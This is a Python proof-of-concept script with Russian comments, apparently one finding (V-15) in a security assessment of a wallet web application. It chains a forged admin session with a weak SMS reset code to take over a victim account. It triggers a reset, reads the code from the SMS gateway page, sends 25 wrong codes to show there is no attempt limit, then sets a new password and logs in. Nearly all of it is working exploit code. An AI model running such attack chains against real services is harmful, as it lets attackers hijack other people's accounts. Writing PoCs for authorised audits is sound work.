# -*- coding: utf-8 -*-
"""V-15. Захват аккаунта через сброс пароля.

Слабости handlers_auth.go: код сброса — 6 цифр, без лимита попыток и без срока
жизни, rid последователен, а сам код виден админу в /gateway/sms (и попадает в
публичный Mailpit-линк по письму). В связке с подделкой admin-сессии (V-02):
триггерим сброс жертве, читаем код, задаём новый пароль, входим.
Дополнительно показываем отсутствие rate-limit на /password/reset.
"""
import re

from wallet_client import Client, parser, banner, ok, fail


def main():
    a = parser("ATO через сброс пароля").parse_args()

    # 1) триггерим сброс жертве
    anon = Client(a.base)
    anon.post_form("/password/forgot", {"login": "sidorov"})

    # 2) читаем код из SMS-шлюза поддельной admin-сессией
    admin = Client(a.base)
    admin.forge(6, "admin")
    sms = admin.get("/gateway/sms")[2].decode("utf-8", "replace")
    m = re.search(r"сброса (\d{6}) \(заявк[аи] #(\d+)\)", sms)
    if not m:
        fail("не удалось прочитать код сброса")
    code, rid = m.group(1), m.group(2)
    banner(f"код сброса жертвы: rid={rid} code={code}")

    # 3) отсутствие лимита попыток: 25 неверных кодов подряд без блокировки
    blocked = False
    for i in range(25):
        b = anon.post_form("/password/reset", {"rid": rid, "sms_code": "000000", "password": "x"})[2]
        if "слишком много" in b.decode("utf-8", "replace").lower():
            blocked = True
            break
    banner(f"25 неверных попыток, блокировка: {blocked}")

    # 4) задаём новый пароль и входим
    anon.post_form("/password/reset", {"rid": rid, "sms_code": code, "password": "Pwned123!"})
    st, hdr, _ = Client(a.base).login("sidorov", "Pwned123!")
    if st != 302:
        fail(f"вход с новым паролем не удался: {st}")
    ok("пароль жертвы сброшен, вход выполнен — полный захват аккаунта")


if __name__ == "__main__":
    main()
